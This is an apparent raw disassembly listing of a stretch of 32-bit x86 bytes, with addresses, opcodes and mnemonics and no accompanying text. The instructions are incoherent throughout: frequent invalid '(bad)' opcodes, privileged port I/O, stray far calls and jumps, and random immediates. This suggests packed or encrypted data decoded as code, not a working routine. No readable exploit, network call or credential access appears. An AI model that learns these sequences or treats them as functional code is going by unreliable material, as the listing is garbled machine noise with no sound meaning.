  417004:	0d ec 07 10 ec       	or     $0xec1007ec,%eax
  417009:	20 a1 57 71 91 04    	and    %ah,0x4917157(%ecx)
  41700f:	70 b8                	jo     0x416fc9
  417011:	a2 ef a2 96 f0       	mov    %al,0xf096a2ef
  417016:	5d                   	pop    %ebp
  417017:	80 f3 00             	xor    $0x0,%bl
  41701a:	17                   	pop    %ss
  41701b:	ba e7 8b ec 19       	mov    $0x19ec8be7,%edx
  417020:	fc                   	cld
  417021:	03 07                	add    (%edi),%eax
  417023:	54                   	push   %esp
  417024:	8f                   	(bad)
  417025:	1c a3                	sbb    $0xa3,%al
  417027:	63 f7                	arpl   %esi,%edi
  417029:	2a 7b c2             	sub    -0x3e(%ebx),%bh
  41702c:	2c a3                	sub    $0xa3,%al
  41702e:	e1 6c                	loope  0x41709c
  417030:	a2 63 4c bb c6       	mov    %al,0xc6bb4c63
  417035:	a8 b8                	test   $0xb8,%al
  417037:	69 3a 03 30 40 0d    	imul   $0xd403003,(%edx),%edi
  41703d:	54                   	push   %esp
  41703e:	48                   	dec    %eax
  41703f:	b6 30                	mov    $0x30,%dh
  417041:	2b 50 a1             	sub    -0x5f(%eax),%edx
  417044:	e5 69                	in     $0x69,%eax
  417046:	f7 88 6b 50 32 c8 50 	testl  $0x3bd09850,-0x37cdaf95(%eax)
  41704d:	98 d0 3b 
  417050:	1b a4 e4 24 bc 4f 54 	sbb    0x544fbc24(%esp,%eiz,8),%esp
  417057:	69 37 00 0f 35 17    	imul   $0x17350f00,(%edi),%esi
  41705d:	e4 8d                	in     $0x8d,%al
  41705f:	f0 a1 18 8e 40 1c    	lock mov 0x1c408e18,%eax
  417065:	a3 06 1c 97 6c       	mov    %eax,0x6c971c06
  41706a:	b2 5c                	mov    $0x5c,%dl
  41706c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  41706d:	5e                   	pop    %esi
  41706e:	fa                   	cli
  41706f:	c3                   	ret
  417070:	02 d7                	add    %bh,%dl
  417072:	5f                   	pop    %edi
  417073:	08 4b 83             	or     %cl,-0x7d(%ebx)
  417076:	fb                   	sti
  417077:	0b 2d 6a 1c e0 09    	or     0x9e01c6a,%ebp
  41707d:	80 a9 f5 90 95 90 d9 	subb   $0xd9,-0x6f6a6f0b(%ecx)
  417084:	37                   	aaa
  417085:	44                   	inc    %esp
  417086:	8c 6e a3             	mov    %gs,-0x5d(%esi)
  417089:	3b 75 e8             	cmp    -0x18(%ebp),%esi
  41708c:	75 09                	jne    0x417097
  41708e:	17                   	pop    %ss
  41708f:	24 e0                	and    $0xe0,%al
  417091:	77 a6                	ja     0x417039
  417093:	ae                   	scas   %es:(%edi),%al
  417094:	2c ff                	sub    $0xff,%al
  417096:	75 d3                	jne    0x41706b
  417098:	a1 1c 06 79 9f       	mov    0x9f79061c,%eax
  41709d:	0d 19 7b 14 8b       	or     $0x8b147b19,%eax
  4170a2:	d8 3e                	fdivrs (%esi)
  4170a4:	33 19                	xor    (%ecx),%ebx
  4170a6:	08 ff                	or     %bh,%bh
  4170a8:	51                   	push   %ecx
  4170a9:	b1 01                	mov    $0x1,%cl
  4170ab:	bb b0 18 41 0c       	mov    $0xc4118b0,%ebx
  4170b0:	1a 44 44 4c          	sbb    0x4c(%esp,%eax,2),%al
  4170b4:	e6 26                	out    %al,$0x26
  4170b6:	8b cd                	mov    %ebp,%ecx
  4170b8:	77 63                	ja     0x41711d
  4170ba:	8d a1 80 68 56 30    	lea    0x30566880(%ecx),%esp
  4170c0:	58                   	pop    %eax
  4170c1:	81 ee 4d 61 d1 b7    	sub    $0xb7d1614d,%esi
  4170c7:	b0 53                	mov    $0x53,%al
  4170c9:	74 08                	je     0x4170d3
  4170cb:	35 9f a8 23 28       	xor    $0x2823a89f,%eax
  4170d0:	bf d2 e2 96 28       	mov    $0x2896e2d2,%edi
  4170d5:	11 81 e8 60 08 95    	adc    %eax,-0x6af79f18(%ecx)
  4170db:	ec                   	in     (%dx),%al
  4170dc:	77 1b                	ja     0x4170f9
  4170de:	20 f8                	and    %bh,%al
  4170e0:	50                   	push   %eax
  4170e1:	8e f6                	mov    %esi,%?
  4170e3:	7c 30                	jl     0x417115
  4170e5:	7c 0f                	jl     0x4170f6
  4170e7:	6d                   	insl   (%dx),%es:(%edi)
  4170e8:	41                   	inc    %ecx
  4170e9:	e5 16                	in     $0x16,%eax
  4170eb:	f2 d4 f4             	repnz aam $0xf4
  4170ee:	69 03 c2 3b 01 f0    	imul   $0xf0013bc2,(%ebx),%eax
  4170f4:	21 3c a6             	and    %edi,(%esi,%eiz,4)
  4170f7:	ea 12 6f 3f 10 f0 ff 	ljmp   $0xfff0,$0x103f6f12
  4170fe:	4b                   	dec    %ebx
  4170ff:	08 cb                	or     %cl,%bl
  417101:	7d 19                	jge    0x41711c
  417103:	2b 60 c8             	sub    -0x38(%eax),%esp
  417106:	c1 e1 58             	shl    $0x58,%ecx
  417109:	40                   	inc    %eax
  41710a:	df b7 02 0d 04 8d    	fbstp  -0x72fbf2fe(%edi)
  417110:	14 b0                	adc    $0xb0,%al
  417112:	05 44 cb 2b c4       	add    $0xc42bcb44,%eax
  417117:	1b c0                	sbb    %eax,%eax
  417119:	ac                   	lods   %ds:(%esi),%al
  41711a:	c2 0b b1             	ret    $0xb10b
  41711d:	02 ad 90 0f 40 a3    	add    -0x5cbff070(%ebp),%ch
  417123:	62 18                	bound  %ebx,(%eax)
  417125:	9a f1 45 67 22 1e c4 	lcall  $0xc41e,$0x226745f1
  41712c:	04 c3                	add    $0xc3,%al
  41712e:	5b                   	pop    %ebx
  41712f:	0a 49 b0             	or     -0x50(%ecx),%cl
  417132:	04 41                	add    $0x41,%al
  417134:	83 f1 d5             	xor    $0xffffffd5,%ecx
  417137:	04 83                	add    $0x83,%al
  417139:	00 c0                	add    %al,%al
  41713b:	56                   	push   %esi
  41713c:	ca 08 a1             	lret   $0xa108
  41713f:	8b 91 23 b7 82 cb    	mov    -0x347d48dd(%ecx),%edx
  417145:	ca 04 9e             	lret   $0x9e04
  417148:	2c e9                	sub    $0xe9,%al
  41714a:	e1 05                	loope  0x417151
  41714c:	a3 72 3a 47 39       	mov    %eax,0x39473a72
  417151:	8f                   	(bad)
  417152:	2d a3 1a f2 88       	sub    $0x88f21aa3,%eax
  417157:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  417158:	42                   	inc    %edx
  417159:	87 fc                	xchg   %edi,%esp
  41715b:	2a de                	sub    %dh,%bl
  41715d:	09 ce                	or     %ecx,%esi
  41715f:	a1 bc 9e d8 95       	mov    0x95d89ebc,%eax
  417164:	04 8f                	add    $0x8f,%al
  417166:	39 47 b5             	cmp    %eax,-0x4b(%edi)
  417169:	92                   	xchg   %eax,%edx
  41716a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  41716b:	3c 4e                	cmp    $0x4e,%al
  41716d:	de 42 75             	fiadds 0x75(%edx)
  417170:	90                   	nop
  417171:	ee                   	out    %al,(%dx)
  417172:	43                   	inc    %ebx
  417173:	79 b0                	jns    0x417125
  417175:	7b 08                	jnp    0x41717f
  417177:	f8                   	clc
  417178:	37                   	aaa
  417179:	28 0a                	sub    %cl,(%edx)
  41717b:	83 fa 40             	cmp    $0x40,%edx
  41717e:	7e 0e                	jle    0x41718e
  417180:	8b ca                	mov    %edx,%ecx
  417182:	a2 c2 76 12 43       	mov    %al,0x431276c2
  417187:	eb 11                	jmp    0x41719a
  417189:	12 08                	adc    (%eax),%cl
  41718b:	54                   	push   %esp
  41718c:	84 8f 05 91 41 dc    	test   %cl,-0x23be6efb(%edi)
  417192:	03 ca                	add    %edx,%ecx
  417194:	8b d1                	mov    %ecx,%edx
  417196:	4a                   	dec    %edx
  417197:	d4 2f                	aam    $0x2f
  417199:	59                   	pop    %ecx
  41719a:	40                   	inc    %eax
  41719b:	37                   	aaa
  41719c:	57                   	push   %edi
  41719d:	08 81 db 40 ba 4d    	or     %al,0x4dba40db(%ecx)
  4171a3:	6d                   	insl   (%dx),%es:(%edi)
  4171a4:	07                   	pop    %es
  4171a5:	7e 5f                	jle    0x417206
  4171a7:	84 1b                	test   %bl,(%ebx)
  4171a9:	0c 15                	or     $0x15,%al
  4171ab:	ea 1b 55 9e d6 c1 e2 	ljmp   $0xe2c1,$0xd69e551b
  4171b2:	02 84 8b a8 3d 04 c1 	add    -0x3efbc258(%ebx,%ecx,4),%al
  4171b9:	89 11                	mov    %edx,(%ecx)
  4171bb:	a3 92 03 9b 0d       	mov    %eax,0xd9b0392
  4171c0:	99                   	cltd
  4171c1:	3c 50                	cmp    $0x50,%al
  4171c3:	3e c2 21 1c          	ds ret $0x1c21
  4171c7:	7e 09                	jle    0x4171d2
  4171c9:	90                   	nop
  4171ca:	ec                   	in     (%dx),%al
  4171cb:	8b 7e 19             	mov    0x19(%esi),%edi
  4171ce:	8b 53 74             	mov    0x74(%ebx),%edx
  4171d1:	0b d8                	or     %eax,%ebx
  4171d3:	1a 84 82 23 2b 7f c1 	sbb    -0x3e80d4dd(%edx,%eax,4),%al
  4171da:	e0 51                	loopne 0x41722d
  4171dc:	0f 41 0b             	cmovno (%ebx),%ecx
  4171df:	3e 92                	ds xchg %eax,%edx
  4171e1:	8e eb                	mov    %ebx,%gs
  4171e3:	77 bc                	ja     0x4171a1
  4171e5:	ff 4b 92             	decl   -0x6e(%ebx)
  4171e8:	4d                   	dec    %ebp
  4171e9:	8b fe                	mov    %esi,%edi
  4171eb:	2b fd                	sub    %ebp,%edi
  4171ed:	7f 0e                	jg     0x4171fd
  4171ef:	4f                   	dec    %edi
  4171f0:	8b d5                	mov    %ebp,%edx
  4171f2:	32 96 4d 47 75 a8    	xor    -0x578ab8b3(%esi),%dl
  4171f8:	77 02                	ja     0x4171fc
  4171fa:	b6 f3                	mov    $0xf3,%dh
  4171fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4171fd:	08 89 af d3 10 39    	or     %cl,0x3910d3af(%ecx)
  417203:	c8 ef 08 9a          	enter  $0x8ef,$0x9a
  417207:	bc 61 d4 0b bf       	mov    $0xbf0bd461,%esp
  41720c:	14 89                	adc    $0x89,%al
  41720e:	46                   	inc    %esi
  41720f:	b7 46                	mov    $0x46,%bh
  417211:	20 00                	and    %al,(%eax)
  417213:	da 8c 41 20 4a cf f8 	fimull -0x730b5e0(%ecx,%eax,2)
  41721a:	8b 22                	mov    (%edx),%esp
  41721c:	c5 02                	lds    (%edx),%eax
  41721e:	7a 88                	jp     0x4171a8
  417220:	55                   	push   %ebp
  417221:	fb                   	sti
  417222:	f5                   	cmc
  417223:	53                   	push   %ebx
  417224:	af                   	scas   %es:(%edi),%eax
  417225:	8a 24 9f             	mov    (%edi,%ebx,4),%ah
  417228:	51                   	push   %ecx
  417229:	56                   	push   %esi
  41722a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  41722b:	65 51                	gs push %ecx
  41722d:	e7 f6                	out    %eax,$0xf6
  41722f:	51                   	push   %ecx
  417230:	38 8a 26 80 e2 0d    	cmp    %cl,0xde28026(%edx)
  417236:	e6 26                	out    %al,$0x26
  417238:	e1 fd                	loope  0x417237
  41723a:	c1 5d 2b 3b          	rcrl   $0x3b,0x2b(%ebp)
  41723e:	80 41 38 7b          	addb   $0x7b,0x38(%ecx)
  417242:	01 ce                	add    %ecx,%esi
  417244:	90                   	nop
  417245:	50                   	push   %eax
  417246:	cd 1e                	int    $0x1e
  417248:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  417249:	62 e9 e4             	(bad) {bad}
  41724c:	80 7d 51 7e          	cmpb   $0x7e,0x51(%ebp)
  417250:	08 e1                	or     %ah,%cl
  417252:	91                   	xchg   %eax,%ecx
  417253:	8f ea 08 f2          	(bad)
  417257:	90                   	nop
  417258:	db 08                	fisttpl (%eax)
  41725a:	54                   	push   %esp
  41725b:	87 c5                	xchg   %eax,%ebp
  41725d:	0c c9                	or     $0xc9,%al
  41725f:	8f                   	(bad)
  417260:	37                   	aaa
  417261:	f8                   	clc
  417262:	21 05 e4 95 77 ac    	and    %eax,0xac7795e4
  417268:	f4                   	hlt
  417269:	2f                   	das
  41726a:	10 4d 1b             	adc    %cl,0x1b(%ebp)
  41726d:	74 85                	je     0x4171f4
  41726f:	ba 92 87 11 64       	mov    $0x64118792,%edx
  417274:	30 88 af 16 83 cc    	xor    %cl,-0x337ce951(%eax)
  41727a:	c7                   	(bad)
  41727b:	ec                   	in     (%dx),%al
  41727c:	67 11 ae 62 c9       	adc    %ebp,-0x369e(%bp)
  417281:	dc 5c 86 55          	fcompl 0x55(%esi,%eax,4)
  417285:	7c 53                	jl     0x4172da
  417287:	90                   	nop
  417288:	a8 c8                	test   $0xc8,%al
  41728a:	1d 8d 95 fc fe       	sbb    $0xfefc958d,%eax
  41728f:	80 67 c4 92          	andb   $0x92,-0x3c(%edi)
  417293:	0a 0c 89             	or     (%ecx,%ecx,4),%cl
  417296:	26 1c 1e             	es sbb $0x1e,%al
  417299:	88 c9                	mov    %cl,%cl
  41729b:	91                   	xchg   %eax,%ecx
  41729c:	0a 9c a8 d7 ec 73 32 	or     0x3273ecd7(%eax,%ebp,4),%bl
  4172a3:	98                   	cwtl
  4172a4:	79 f0                	jns    0x417296
  4172a6:	39 03                	cmp    %eax,(%ebx)
  4172a8:	85 ac 60 46 b6 1f f4 	test   %ebp,-0xbe049ba(%eax,%eiz,2)
  4172af:	f8                   	clc
  4172b0:	e8 2c 00 1c 0f       	call   0xf5d72e1
  4172b5:	40                   	inc    %eax
  4172b6:	86 58 18             	xchg   %bl,0x18(%eax)
  4172b9:	18 27                	sbb    %ah,(%edi)
  4172bb:	e4 12                	in     $0x12,%al
  4172bd:	3b e8                	cmp    %eax,%ebp
  4172bf:	8d a8 fd 96 c3 00    	lea    0xc396fd(%eax),%ebp
  4172c5:	06                   	push   %es
  4172c6:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4172c7:	03 6e 6e             	add    0x6e(%esi),%ebp
  4172ca:	c2 d9 05             	ret    $0x5d9
  4172cd:	01 00                	add    %eax,(%eax)
  4172cf:	92                   	xchg   %eax,%edx
  4172d0:	d8 90 b7 db 27 41    	fcoms  0x4127dbb7(%eax)
  4172d6:	b3 91                	mov    $0x91,%bl
  4172d8:	fc                   	cld
  4172d9:	57                   	push   %edi
  4172da:	dc e8                	fsubr  %st,%st(0)
  4172dc:	41                   	inc    %ecx
  4172dd:	bd 56 96 a4 a9       	mov    $0xa9a49656,%ebp
  4172e2:	75 d8                	jne    0x4172bc
  4172e4:	ef                   	out    %eax,(%dx)
  4172e5:	15 2d 6a c1 d7       	adc    $0xd7c16a2d,%eax
  4172ea:	36 66 3b a6 80 35 4b 	cmp    %ss:-0x7bb4ca80(%esi),%sp
  4172f1:	84 
  4172f2:	1b 33                	sbb    (%ebx),%esi
  4172f4:	0e                   	push   %cs
  4172f5:	a9 1a 54 9f 6c       	test   $0x6c9f541a,%eax
  4172fa:	0b fe                	or     %esi,%edi
  4172fc:	83 7d fc 0a          	cmpl   $0xa,-0x4(%ebp)
  417300:	06                   	push   %es
  417301:	b4 6c                	mov    $0x6c,%ah
  417303:	02 7d 58             	add    0x58(%ebp),%bh
  417306:	a9 37 e3 9c ec       	test   $0xec9ce337,%eax
  41730b:	04 bc                	add    $0xbc,%al
  41730d:	89 79 ba             	mov    %edi,-0x46(%ecx)
  417310:	48                   	dec    %eax
  417311:	a9 08 10 ac 95       	test   $0x95ac1008,%eax
  417316:	e4 c7                	in     $0xc7,%al
  417318:	90                   	nop
  417319:	8f                   	(bad)
  41731a:	57                   	push   %edi
  41731b:	1b 30                	sbb    (%eax),%esi
  41731d:	bb b8 6c 04 e0       	mov    $0xe0046cb8,%ebx
  417322:	25 1c a3 34 d1       	and    $0xd134a31c,%eax
  417327:	97                   	xchg   %eax,%edi
  417328:	8c 37                	mov    %?,(%edi)
  41732a:	09 8c 54 a5 d7 c3 94 	or     %ecx,-0x6b3c285b(%esp,%edx,2)
  417331:	3b cb                	cmp    %ebx,%ecx
  417333:	10 c1                	adc    %al,%cl
  417335:	f0 01 aa 54 26 81 77 	lock add %ebp,0x77812654(%edx)
  41733c:	49                   	dec    %ecx
  41733d:	55                   	push   %ebp
  41733e:	fb                   	sti
  41733f:	f9                   	stc
  417340:	23 83 97 71 0e ec    	and    -0x13f18e69(%ebx),%eax
  417346:	34 23                	xor    $0x23,%al
  417348:	24 e3                	and    $0xe3,%al
  41734a:	f4                   	hlt
  41734b:	88 52 34             	mov    %dl,0x34(%edx)
  41734e:	08 28                	or     %ch,(%eax)
  417350:	f4                   	hlt
  417351:	06                   	push   %es
  417352:	8c 4d c8             	mov    %cs,-0x38(%ebp)
  417355:	93                   	xchg   %eax,%ebx
  417356:	08 7f aa             	or     %bh,-0x56(%edi)
  417359:	9a 15 62 ae 20 d8 80 	lcall  $0x80d8,$0x20ae6215
  417360:	f8                   	clc
  417361:	79 ac                	jns    0x41730f
  417363:	51                   	push   %ecx
  417364:	fa                   	cli
  417365:	73 fc                	jae    0x417363
  417367:	2d 46 33 db 8d       	sub    $0x8ddb3346,%eax
  41736c:	4d                   	dec    %ebp
  41736d:	82 16 38             	adcb   $0x38,(%esi)
  417370:	ff 57 42             	call   *0x42(%edi)
  417373:	81 07 b3 06 f0 0d    	addl   $0xdf006b3,(%edi)
  417379:	19 62 4e             	sbb    %esp,0x4e(%edx)
  41737c:	d2 7f 5d             	sarb   %cl,0x5d(%edi)
  41737f:	44                   	inc    %esp
  417380:	5a                   	pop    %edx
  417381:	18 38                	sbb    %bh,(%eax)
  417383:	43                   	inc    %ebx
  417384:	4e                   	dec    %esi
  417385:	75 d6                	jne    0x41735d
  417387:	17                   	pop    %ss
  417388:	69 aa 49 18 c2 43 9b 	imul   $0x3d20b89b,0x43c21849(%edx),%ebp
  41738f:	b8 20 3d 
  417392:	28 60 25             	sub    %ah,0x25(%eax)
  417395:	cf                   	iret
  417396:	86 aa f4 13 e1 0a    	xchg   %ch,0xae113f4(%edx)
  41739c:	49                   	dec    %ecx
  41739d:	2f                   	das
  41739e:	2d ad 37 b0 03       	sub    $0x3b037ad,%eax
  4173a3:	9b                   	fwait
  4173a4:	64 48                	fs dec %eax
  4173a6:	a0 45 b0 e9 c6       	mov    0xc6e9b045,%al
  4173ab:	93                   	xchg   %eax,%ebx
  4173ac:	3d df 37 b0 40       	cmp    $0x40b037df,%eax
  4173b1:	95                   	xchg   %eax,%ebp
  4173b2:	fc                   	cld
  4173b3:	3c 86                	cmp    $0x86,%al
  4173b5:	fa                   	cli
  4173b6:	f0 10 0b             	lock adc %cl,(%ebx)
  4173b9:	20 26                	and    %ah,(%esi)
  4173bb:	79 b8                	jns    0x417375
  4173bd:	02 1d a9 3a 69 7b    	add    0x7b693aa9,%bl
  4173c3:	7b 04                	jnp    0x4173c9
  4173c5:	3b d4                	cmp    %esp,%edx
  4173c7:	e9 09 8d a9 4f       	jmp    0x4feb00d5
  4173cc:	30 ff                	xor    %bh,%bh
  4173ce:	95                   	xchg   %eax,%ebp
  4173cf:	b4 95                	mov    $0x95,%ah
  4173d1:	ad                   	lods   %ds:(%esi),%eax
  4173d2:	18 e3                	sbb    %ah,%bl
  4173d4:	01 08                	add    %ecx,(%eax)
  4173d6:	54                   	push   %esp
  4173d7:	70 7d                	jo     0x417456
  4173d9:	17                   	pop    %ss
  4173da:	f6 fd                	idiv   %ch
  4173dc:	33 2d b3 01 0e c6    	xor    0xc60e01b3,%ebp
  4173e2:	94                   	xchg   %eax,%esp
  4173e3:	27                   	daa
  4173e4:	13 d6                	adc    %esi,%edx
  4173e6:	98                   	cwtl
  4173e7:	fd                   	std
  4173e8:	f6 8d 27 f8 67 cc 4e 	testb  $0x4e,-0x339807d9(%ebp)
  4173ef:	80 f3 01             	xor    $0x1,%bl
  4173f2:	eb 10                	jmp    0x417404
  4173f4:	11 8b b8 15 44 49    	adc    %ecx,0x494415b8(%ebx)
  4173fa:	a3 9f c3 9c d8       	mov    %eax,0xd89cc39f
  4173ff:	a0 2e ab 5d 7b       	mov    0x7b5dab2e,%al
  417404:	53                   	push   %ebx
  417405:	e8 89 73 d4 14       	call   0x1515e793
  41740a:	64 44                	fs inc %esp
  41740c:	91                   	xchg   %eax,%ecx
  41740d:	d0 c9                	ror    $1,%cl
  41740f:	08 f6                	or     %dh,%dh
  417411:	c2 cf 1d             	ret    $0x1dcf
  417414:	80 b4 1e 44 14 59 58 	xorb   $0xba,0x58591444(%esi,%ebx,1)
  41741b:	ba 
  41741c:	b4 ab                	mov    $0xab,%ah
  41741e:	bc 8c a8 c5 20       	mov    $0x20c5a88c,%esp
  417423:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  417424:	aa                   	stos   %al,%es:(%edi)
  417425:	ef                   	out    %eax,(%dx)
  417426:	df 82 51 39 07 8c    	filds  -0x73f8c6af(%edx)
  41742c:	0f 48 04 83          	cmovs  (%ebx,%eax,4),%eax
  417430:	78 4c                	js     0x41747e
  417432:	c2 73 74             	ret    $0x7473
  417435:	bb 07 59 b9 f7       	mov    $0xf7b95907,%ebx
  41743a:	ec                   	in     (%dx),%al
  41743b:	e4 25                	in     $0x25,%al
  41743d:	0b 83 f0 fa ec 65    	or     0x65ecfaf0(%ebx),%eax
  417443:	ac                   	lods   %ds:(%esi),%al
  417444:	84 49 c4             	test   %cl,-0x3c(%ecx)
  417447:	3e c6 45 f7 5b       	movb   $0x5b,%ds:-0x9(%ebp)
  41744c:	f7 f2                	div    %edx
  41744e:	3c bc                	cmp    $0xbc,%al
  417450:	10 34 f9             	adc    %dh,(%ecx,%edi,8)
  417453:	3b 8b f3 f6 30 36    	cmp    0x3630f6f3(%ebx),%ecx
  417459:	0e                   	push   %cs
  41745a:	f2 8c f0             	repnz mov %?,%eax
  41745d:	fc                   	cld
  41745e:	f0 50                	lock push %eax
  417460:	07                   	pop    %es
  417461:	ec                   	in     (%dx),%al
  417462:	c3                   	ret
  417463:	4f                   	dec    %edi
  417464:	3f                   	aas
  417465:	41                   	inc    %ecx
  417466:	55                   	push   %ebp
  417467:	ec                   	in     (%dx),%al
  417468:	58                   	pop    %eax
  417469:	14 64                	adc    $0x64,%al
  41746b:	75 08                	jne    0x417475
  41746d:	f9                   	stc
  41746e:	e6 21                	out    %al,$0x21
  417470:	11 5d d3             	adc    %ebx,-0x2d(%ebp)
  417473:	50                   	push   %eax
  417474:	01 f3                	add    %esi,%ebx
  417476:	6c                   	insb   (%dx),%es:(%edi)
  417477:	ac                   	lods   %ds:(%esi),%al
  417478:	92                   	xchg   %eax,%edx
  417479:	45                   	inc    %ebp
  41747a:	9b                   	fwait
  41747b:	92                   	xchg   %eax,%edx
  41747c:	ec                   	in     (%dx),%al
  41747d:	8a 25 0b 5c 20 8f    	mov    0x8f205c0b,%ah
  417483:	24 73                	and    $0x73,%al
  417485:	9c                   	pushf
  417486:	74 5c                	je     0x4174e4
  417488:	2f                   	das
  417489:	21 60 85             	and    %esp,-0x7b(%eax)
  41748c:	bb fc ac a5 24       	mov    $0x24a5acfc,%ebx
  417491:	07                   	pop    %es
  417492:	12 76 c6             	adc    -0x3a(%esi),%dh
  417495:	18 f2                	sbb    %dh,%dl
  417497:	10 02                	adc    %al,(%edx)
  417499:	be c3 5b 78 b1       	mov    $0xb1785bc3,%esi
  41749e:	03 ad 05 a4 a2 10    	add    0x10a2a405(%ebp),%ebp
  4174a4:	e7 20                	out    %eax,$0x20
  4174a6:	bd ed 55 d1 02       	mov    $0x2d155ed,%ebp
  4174ab:	f4                   	hlt
  4174ac:	9b                   	fwait
  4174ad:	37                   	aaa
  4174ae:	42                   	inc    %edx
  4174af:	b2 03                	mov    $0x3,%dl
  4174b1:	e4 e4                	in     $0xe4,%al
  4174b3:	ad                   	lods   %ds:(%esi),%eax
  4174b4:	c2 15 2e             	ret    $0x2e15
  4174b7:	18 26                	sbb    %ah,(%esi)
  4174b9:	63 c9                	arpl   %ecx,%ecx
  4174bb:	f4                   	hlt
  4174bc:	8b 18                	mov    (%eax),%ebx
  4174be:	e4 1b                	in     $0x1b,%al
  4174c0:	10 92 3c 48 d6 55    	adc    %dl,0x55d6483c(%edx)
  4174c6:	20 16                	and    %dl,(%esi)
  4174c8:	9b                   	fwait
  4174c9:	f4                   	hlt
  4174ca:	82 34 48 15          	xorb   $0x15,(%eax,%ecx,2)
  4174ce:	c2 49 f6             	ret    $0xf649
  4174d1:	22 fa                	and    %dl,%bh
  4174d3:	9e                   	sahf
  4174d4:	18 0c 20             	sbb    %cl,(%eax,%eiz,1)
  4174d7:	8e 19                	mov    (%ecx),%ds
  4174d9:	03 c9                	add    %ecx,%ecx
  4174db:	49                   	dec    %ecx
  4174dc:	1a 5f c9             	sbb    -0x37(%edi),%bl
  4174df:	ad                   	lods   %ds:(%esi),%eax
  4174e0:	eb 96                	jmp    0x417478
  4174e2:	b0 92                	mov    $0x92,%al
  4174e4:	87 ad 7e f0 7b 61    	xchg   %ebp,0x617bf07e(%ebp)
  4174ea:	c2 cb 1d             	ret    $0x1dcb
  4174ed:	ed                   	in     (%dx),%eax
  4174ee:	07                   	pop    %es
  4174ef:	9f                   	lahf
  4174f0:	4b                   	dec    %ebx
  4174f1:	45                   	inc    %ebp
  4174f2:	d5 4b                	aad    $0x4b
  4174f4:	58                   	pop    %eax
  4174f5:	3c 45                	cmp    $0x45,%al
  4174f7:	ae                   	scas   %es:(%edi),%al
  4174f8:	bc 99 bc 0d d0       	mov    $0xd00dbc99,%esp
  4174fd:	09 20                	or     %esp,(%eax)
  4174ff:	28 ea                	sub    %ch,%dl
  417501:	5f                   	pop    %edi
  417502:	94                   	xchg   %eax,%esp
  417503:	26 a9 ad e4 20 48    	es test $0x4820e4ad,%eax
  417509:	4c                   	dec    %esp
  41750a:	ae                   	scas   %es:(%edi),%al
  41750b:	32 53 21             	xor    0x21(%ebx),%dl
  41750e:	83 8c 31 83 e8 e8 94 	orl    $0x68,-0x6b17177d(%ecx,%esi,1)
  417515:	68 
  417516:	48                   	dec    %eax
  417517:	3a 2b                	cmp    (%ebx),%ch
  417519:	af                   	scas   %es:(%edi),%eax
  41751a:	b7 14                	mov    $0x14,%bh
  41751c:	84 8a 8e b5 11 1f    	test   %cl,0x1f11b58e(%edx)
  417522:	75 6e                	jne    0x417592
  417524:	29 46 c3             	sub    %eax,-0x3d(%esi)
  417527:	15 b5 13 8f 8d       	adc    $0x8d8f13b5,%eax
  41752c:	36 ef                	ss out %eax,(%dx)
  41752e:	7d 45                	jge    0x417575
  417530:	f4                   	hlt
  417531:	8a 26                	mov    (%esi),%ah
  417533:	e8 44 ea 63 a3       	call   0xa3a55f7c
  417538:	bd 2e 03 d8 ff       	mov    $0xffd8032e,%ebp
  41753d:	21 70 df             	and    %esi,-0x21(%eax)
  417540:	87 cb                	xchg   %ecx,%ebx
  417542:	d6                   	salc
  417543:	15 34 09 db 66       	adc    $0x66db0934,%eax
  417548:	1b 41 32             	sbb    0x32(%ecx),%eax
  41754b:	21 97 0c 40 ec ec    	and    %edx,-0x1313bff4(%edi)
  417551:	6d                   	insl   (%dx),%es:(%edi)
  417552:	87 2f                	xchg   %ebp,(%edi)
  417554:	22 c1                	and    %cl,%al
  417556:	0e                   	push   %cs
  417557:	6b 1d cf 8d dd fe 18 	imul   $0x18,0xfedd8dcf,%ebx
  41755e:	0e                   	push   %cs
  41755f:	03 df                	add    %edi,%ebx
  417561:	c6 03 0d             	movb   $0xd,(%ebx)
  417564:	43                   	inc    %ebx
  417565:	03 0a                	add    (%edx),%ecx
  417567:	43                   	inc    %ebx
  417568:	58                   	pop    %eax
  417569:	c8 c8 93 87          	enter  $0x93c8,$0x87
  41756d:	44                   	inc    %esp
  41756e:	d7                   	xlat   %ds:(%ebx)
  41756f:	32 af a1 da b2 09    	xor    0x9b2daa1(%edi),%ch
  417575:	04 56                	add    $0x56,%al
  417577:	63 a9 e4 e3 f1 37    	arpl   %ebp,0x37f1e3e4(%ecx)
  41757d:	95                   	xchg   %eax,%ebp
  41757e:	5c                   	pop    %esp
  41757f:	85 db                	test   %ebx,%ebx
  417581:	7c 23                	jl     0x4175a6
  417583:	43                   	inc    %ebx
  417584:	33 f6                	xor    %esi,%esi
  417586:	27                   	daa
  417587:	0d 80 5f ad 2d       	or     $0x2dad5f80,%eax
  41758c:	72 a4                	jb     0x417532
  41758e:	37                   	aaa
  41758f:	5b                   	pop    %ebx
  417590:	cc                   	int3
  417591:	27                   	daa
  417592:	81 bf 2b 77 46 4b 75 	cmpl   $0xce83e075,0x4b46772b(%edi)
  417599:	e0 83 ce 
  41759c:	ff 29                	ljmp   *(%ecx)
  41759e:	b0 af                	mov    $0xaf,%al
  4175a0:	5a                   	pop    %edx
  4175a1:	76 60                	jbe    0x417603
  4175a3:	25 e0 7f 70 75       	and    $0x75707fe0,%eax
  4175a8:	03 a1 b7 06 d7 9f    	add    -0x6028f949(%ecx),%esp
  4175ae:	7a 1c                	jp     0x4175cc
  4175b0:	b2 3d                	mov    $0x3d,%dl
  4175b2:	2a 0b                	sub    (%ebx),%cl
  4175b4:	08 24 de             	or     %ah,(%esi,%ebx,8)
  4175b7:	5b                   	pop    %ebx
  4175b8:	0a 0e                	or     (%esi),%cl
  4175ba:	8b 4b 51             	mov    0x51(%ebx),%ecx
  4175bd:	96                   	xchg   %eax,%esi
  4175be:	6a 96                	push   $0xffffff96
  4175c0:	fb                   	sti
  4175c1:	55                   	push   %ebp
  4175c2:	b8 7a ca a1 3c       	mov    $0x3ca1ca7a,%eax
  4175c7:	9b df ab 68 b5 9e 86 	fildll -0x79614a98(%ebx)
  4175ce:	24 07                	and    $0x7,%al
  4175d0:	34 b0                	xor    $0xb0,%al
  4175d2:	fd                   	std
  4175d3:	c6                   	(bad)
